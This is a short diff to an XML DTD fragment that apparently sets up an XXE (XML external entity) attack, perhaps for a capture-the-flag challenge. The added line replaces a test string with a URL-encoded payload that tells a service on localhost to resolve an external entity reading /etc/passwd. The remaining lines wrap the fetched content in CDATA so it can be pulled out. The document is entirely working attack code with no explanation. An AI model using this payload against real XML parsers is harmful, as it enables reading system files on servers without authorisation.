@@ -1,4 +1,4 @@
-<!ENTITY % web SYSTEM "http://localhost:1234/?incantation=<XML>TESTING</XML>">
+<!ENTITY % web SYSTEM "http://localhost:1234/?incantation=<!DOCTYPE+spell+[<!ENTITY+xxe+SYSTEM+%22file%3a///etc/passwd%22>]><spell>%26xxe</spell>">
 <!ENTITY % start "<![CDATA[">
 <!ENTITY % end "]]>">
 <!ENTITY % all "<!ENTITY Contents '%start;%web;%end;'>">
